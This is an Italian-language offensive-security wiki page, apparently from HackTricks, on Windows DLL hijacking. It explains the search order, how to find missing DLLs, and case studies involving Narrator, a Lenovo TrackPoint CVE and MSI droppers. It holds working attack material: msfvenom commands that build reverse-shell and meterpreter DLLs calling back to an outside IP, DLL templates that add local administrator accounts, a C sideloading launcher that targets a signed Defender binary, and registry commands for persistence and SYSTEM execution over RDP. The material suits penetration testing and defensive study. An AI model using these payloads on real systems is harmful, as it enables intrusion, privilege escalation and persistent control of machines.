# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informazioni di base

DLL Hijacking consiste nel manipolare un'applicazione di fiducia affinché carichi una DLL malevola. Questo termine racchiude diverse tattiche come **DLL Spoofing, Injection, and Side-Loading**. Viene impiegato principalmente per l'esecuzione di codice, ottenere persistenza e, meno comunemente, per la escalation dei privilegi. Nonostante qui l'attenzione sia posta sull'escalation, il metodo di hijacking rimane sostanzialmente lo stesso a prescindere dall'obiettivo.

### Tecniche comuni

Vengono impiegati diversi metodi per il DLL hijacking, ognuno con la sua efficacia a seconda della strategia di caricamento DLL dell'applicazione:

1. **DLL Replacement**: Sostituire una DLL legittima con una malevola, opzionalmente usando DLL Proxying per preservare la funzionalità originale della DLL.
2. **DLL Search Order Hijacking**: Posizionare la DLL malevola in un percorso di ricerca che precede quello legittimo, sfruttando il pattern di ricerca dell'applicazione.
3. **Phantom DLL Hijacking**: Creare una DLL malevola che l'applicazione caricherà credendo si tratti di una DLL richiesta ma non esistente.
4. **DLL Redirection**: Modificare parametri di ricerca come %PATH% o i file .exe.manifest / .exe.local per indirizzare l'applicazione verso la DLL malevola.
5. **WinSxS DLL Replacement**: Sostituire la DLL legittima con una controparte malevola nella directory WinSxS, metodo spesso associato al DLL side-loading.
6. **Relative Path DLL Hijacking**: Posizionare la DLL malevola in una directory controllata dall'utente insieme all'applicazione copiata, assimilabile a tecniche di Binary Proxy Execution.

## Trovare DLL mancanti

Il modo più comune per trovare DLL mancanti all'interno di un sistema è eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) di sysinternals, **impostando** i **seguenti 2 filtri**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

e mostrare solo la **File System Activity**:

![](<../../../images/image (153).png>)

Se stai cercando **DLL mancanti in generale** lascia questo in esecuzione per alcuni **secondi**.\
Se stai cercando una **DLL mancante all'interno di uno specifico eseguibile** dovresti impostare **un altro filtro come "Process Name" "contains" `<exec name>`, eseguirlo e interrompere la cattura degli eventi**.

## Sfruttare DLL mancanti

Per scalare i privilegi, la miglior possibilità è poter **scrivere una dll che un processo privilegiato tenterà di caricare** in uno dei **percorsi in cui verrà cercata**. Pertanto, potremo **scrivere** una dll in una **cartella** in cui la **dll viene cercata prima** della cartella dove si trova la **dll originale** (caso anomalo), oppure potremo **scrivere in una cartella in cui la dll verrà cercata** e la dll originale **non esiste** in nessuna cartella.

### Dll Search Order

**Nella** [**documentazione Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puoi trovare come le DLL vengono caricate nello specifico.**

Le applicazioni Windows cercano le DLL seguendo un insieme di percorsi di ricerca predefiniti, rispettando un ordine specifico. Il problema del DLL hijacking si verifica quando una DLL malevola viene posizionata strategicamente in una di queste directory, garantendo che venga caricata prima della DLL autentica. Una soluzione per prevenire ciò è assicurarsi che l'applicazione utilizzi percorsi assoluti quando fa riferimento alle DLL necessarie.

Di seguito puoi vedere l'**ordine di ricerca delle DLL sui sistemi a 32-bit**:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Questo è l'ordine di ricerca predefinito con **SafeDllSearchMode** abilitato. Quando è disabilitato la directory corrente sale al secondo posto. Per disabilitare questa funzionalità, crea il valore di registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e impostalo a 0 (per impostazione predefinita è abilitato).

Se la funzione [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) viene chiamata con **LOAD_WITH_ALTERED_SEARCH_PATH** la ricerca inizia nella directory del modulo eseguibile che **LoadLibraryEx** sta caricando.

Infine, nota che **una dll può essere caricata indicando il percorso assoluto invece del solo nome**. In tal caso quella dll verrà cercata **solo in quel percorso** (se la dll ha dipendenze, queste verranno cercate come caricate per nome).

Esistono altri modi per alterare l'ordine di ricerca ma non li spiegherò qui.

### Forzare il sideloading tramite RTL_USER_PROCESS_PARAMETERS.DllPath

Un modo avanzato per influenzare in modo deterministico il percorso di ricerca delle DLL di un processo appena creato è impostare il campo DllPath in RTL_USER_PROCESS_PARAMETERS quando si crea il processo con le API native di ntdll. Fornendo qui una directory controllata dall'attaccante, un processo bersaglio che risolve una DLL importata per nome (nessun percorso assoluto e senza usare i flag di caricamento sicuro) può essere forzato a caricare una DLL malevola da quella directory.

Idea chiave
- Costruire i parametri del processo con RtlCreateProcessParametersEx e fornire un DllPath personalizzato che punti alla cartella controllata (es. la directory dove risiede il tuo dropper/unpacker).
- Creare il processo con RtlCreateUserProcess. Quando il binario target risolve una DLL per nome, il loader consulterà il DllPath fornito durante la risoluzione, permettendo un sideloading affidabile anche quando la DLL malevola non è colocata con l'EXE target.

Note/limitazioni
- Questo influisce sul processo figlio che viene creato; è diverso da SetDllDirectory, che interessa solo il processo corrente.
- Il target deve importare o chiamare LoadLibrary su una DLL per nome (nessun percorso assoluto e senza usare LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs e percorsi assoluti hardcoded non possono essere hijacked. Forwarded exports e SxS possono cambiare la precedenza.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Esempio C completo: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Esempio operativo d'uso
- Posiziona un xmllite.dll malevolo (esportando le funzioni richieste o fungendo da proxy per quello reale) nella tua directory DllPath.
- Avvia un eseguibile firmato noto per cercare xmllite.dll per nome usando la tecnica sopra descritta. Il loader risolve l'import tramite il DllPath fornito e sideloads la tua DLL.

Questa tecnica è stata osservata in-the-wild per guidare multi-stage sideloading chains: un launcher iniziale deposita una helper DLL, che poi avvia un Microsoft-signed, hijackable binary con un DllPath personalizzato per forzare il caricamento della DLL dell'attaccante da una directory di staging.


#### Eccezioni nell'ordine di ricerca delle dll dalla documentazione di Windows

Alcune eccezioni all'ordine standard di ricerca delle DLL sono indicate nella documentazione di Windows:

- Quando una **DLL che condivide il suo nome con una già caricata in memoria** viene incontrata, il sistema aggira la ricerca usuale. Invece, esegue un controllo per reindirizzamento e un manifest prima di usare di default la DLL già in memoria. **In questo scenario, il sistema non conduce una ricerca per la DLL**.
- Nei casi in cui la DLL è riconosciuta come una **known DLL** per la versione corrente di Windows, il sistema utilizzerà la sua versione della known DLL, insieme a eventuali DLL dipendenti, **saltando il processo di ricerca**. La chiave di registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene l'elenco di queste known DLL.
- Se una **DLL ha dipendenze**, la ricerca per queste DLL dipendenti viene condotta come se fossero indicate solo dai loro **nomi di modulo**, indipendentemente dal fatto che la DLL iniziale sia stata identificata tramite un percorso completo.

### Escalation dei privilegi

**Requisiti**:

- Identificare un processo che opera o opererà con **privilegi differenti** (movimento orizzontale o laterale), che **manca di una DLL**.
- Assicurarsi che sia disponibile **accesso in scrittura** per qualsiasi **directory** in cui la **DLL** verrà **ricercata**. Questa posizione potrebbe essere la directory dell'eseguibile o una directory all'interno del system path.

Sì, i requisiti sono complicati da trovare dato che **di default è piuttosto raro trovare un eseguibile privilegiato privo di una DLL** ed è ancora **più strano avere permessi di scrittura su una cartella del system path** (di norma non è possibile). Ma, in ambienti mal configurati questo è possibile.\
Nel caso tu sia fortunato e soddisfi i requisiti, puoi dare un'occhiata al progetto [UACME](https://github.com/hfiref0x/UACME). Anche se l'**obiettivo principale del progetto è bypass UAC**, potresti trovare lì una **PoC** di una Dll hijaking per la versione di Windows che puoi usare (probabilmente cambiando semplicemente il percorso della cartella su cui hai permessi di scrittura).

Nota che puoi **controllare i tuoi permessi in una cartella** facendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **controlla i permessi di tutte le cartelle in PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Puoi anche controllare gli import di un eseguibile e gli export di una dll con:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Per una guida completa su come **abuse Dll Hijacking to escalate privileges** con i permessi di scrittura in una **System Path folder** consulta:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Strumenti automatici

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) verificherà se hai permessi di scrittura su qualsiasi cartella all'interno di system PATH.\
Altri strumenti automatici interessanti per scoprire questa vulnerabilità sono le **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll_.

### Esempio

Nel caso tu trovi uno scenario sfruttabile, una delle cose più importanti per sfruttarlo con successo è **creare una dll che esporti almeno tutte le funzioni che l'eseguibile importerà da essa**. Comunque, nota che Dll Hijacking è utile per [escalare from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o da[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puoi trovare un esempio di **how to create a valid dll** in questo studio su dll hijacking focalizzato sul dll hijacking per l'execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Inoltre, nella **sezione successiva** puoi trovare alcuni **codici dll di base** che potrebbero essere utili come **template** o per creare una **dll con funzioni non richieste esportate**.

## **Creazione e compilazione di Dll**

### **Dll Proxifying**

Fondamentalmente un **Dll proxy** è una Dll in grado di **eseguire il tuo codice malevolo quando viene caricata** ma anche di **esporsi** e **comportarsi** come **atteso** inoltrando tutte le chiamate alla libreria reale.

Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi effettivamente **indicare un eseguibile e selezionare la libreria** che vuoi proxify e **generare una proxified dll** oppure **indicare la Dll** e **generare una proxified dll**.

### **Meterpreter**

**Ottieni rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Ottieni un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crea un user (x86 non ho visto una versione x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Il proprio

Nota che, in diversi casi, la Dll che compili deve **export several functions** che verranno caricate dal victim process, se queste funzioni non esistono, il **binary won't be able to load** le e il **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Esempio di DLL C++ con creazione utente</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternativa con thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Caso di studio: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe continua a cercare all'avvio una DLL di localizzazione prevedibile e specifica per lingua che può essere soggetta a DLL Hijack per esecuzione di codice arbitrario e persistenza.

Punti chiave
- Percorso ricercato (build correnti): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Percorso legacy (build precedenti): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Se una DLL scrivibile controllata dall'attaccante esiste nel percorso OneCore, viene caricata e `DllMain(DLL_PROCESS_ATTACH)` viene eseguita. Non sono richieste esportazioni.

Scoperta con Procmon
- Filtro: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Avviare Narrator e osservare il tentativo di caricamento del percorso sopra.

DLL minima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Caso di studio: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Dettagli della vulnerabilità

- **Componente**: `TPQMAssistant.exe` situato in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Attività pianificata**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` viene eseguita ogni giorno alle 9:30 sotto il contesto dell'utente connesso.
- **Permessi della directory**: scrivibile da `CREATOR OWNER`, consentendo agli utenti locali di inserire file arbitrari.
- **Comportamento di ricerca DLL**: tenta di caricare `hostfxr.dll` dalla directory di lavoro per prima e registra "NAME NOT FOUND" se mancante, indicando la precedenza della ricerca nella directory locale.

### Implementazione dell'exploit

Un attaccante può posizionare uno stub `hostfxr.dll` maligno nella stessa directory, sfruttando la DLL mancante per ottenere l'esecuzione di codice nel contesto dell'utente:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Flusso d'attacco

1. Come utente standard, inserire `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendere che l'attività pianificata venga eseguita alle 9:30 nel contesto dell'utente corrente.
3. Se un amministratore è connesso quando l'attività viene eseguita, la DLL malevola viene eseguita nella sessione dell'amministratore a integrità media.
4. Concatenare tecniche standard di bypass UAC per elevare da integrità media a privilegi SYSTEM.

## Caso di studio: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors frequently pair MSI-based droppers with DLL side-loading to execute payloads under a trusted, signed process.

Chain overview
- L'utente scarica MSI. Una CustomAction viene eseguita silenziosamente durante l'installazione GUI (es. LaunchApplication o un'azione VBScript), ricostruendo la fase successiva da risorse embedded.
- Il dropper scrive un EXE legittimo e firmato e una DLL malevola nella stessa directory (esempio: EXE firmato da Avast wsc_proxy.exe + wsc.dll controllata dall'attaccante).
- Quando l'EXE firmato viene avviato, l'ordine di ricerca DLL di Windows carica wsc.dll dalla working directory per prima, eseguendo il codice dell'attaccante sotto un processo padre firmato (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Cercare voci che eseguono eseguibili o VBScript. Pattern sospetto: LaunchApplication che esegue un file embedded in background.
- In Orca (Microsoft Orca.exe), ispezionare le tabelle CustomAction, InstallExecuteSequence e Binary.
- Embedded/split payloads in the MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Cercare più frammenti piccoli che vengono concatenati e decrittografati da una CustomAction VBScript. Flusso comune:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Sideloading pratico con wsc_proxy.exe
- Posiziona questi due file nella stessa cartella:
- wsc_proxy.exe: host legittimo e firmato (Avast). Il processo tenta di caricare wsc.dll per nome dalla sua directory.
- wsc.dll: attacker DLL. Se non sono necessari export specifici, DllMain può essere sufficiente; altrimenti, costruisci una proxy DLL e inoltra gli export richiesti alla libreria genuina mentre esegui il payload in DllMain.
- Costruisci un payload DLL minimale:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Per i requisiti di export, usa un framework di proxying (es., DLLirant/Spartacus) per generare una DLL di forwarding che esegua anche il tuo payload.

- Questa tecnica si basa sulla risoluzione del nome DLL da parte dell'host binary. Se l'host usa percorsi assoluti o flag di safe loading (es., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), l'hijack potrebbe fallire.
- KnownDLLs, SxS e forwarded exports possono influenzare la precedenza e devono essere considerati durante la selezione dell'host binary e dell'export set.

## Riferimenti

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
